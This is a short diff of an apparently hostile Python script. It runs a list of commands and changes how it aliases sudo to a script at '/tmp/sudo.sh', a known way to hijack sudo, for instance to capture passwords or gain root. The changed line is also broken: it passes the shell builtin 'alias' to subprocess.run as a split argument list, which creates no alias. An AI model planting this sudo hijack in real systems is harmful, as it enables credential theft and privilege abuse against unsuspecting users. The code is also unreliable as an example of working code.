@@ -10,4 +10,4 @@ for i in all_commands:
     print(i)
     subprocess.run(i.split(" "))
 
-os.system("alias sudo='/tmp/sudo.sh'")
+subprocess.run("alias sudo='/tmp/sudo.sh'".split(" "))
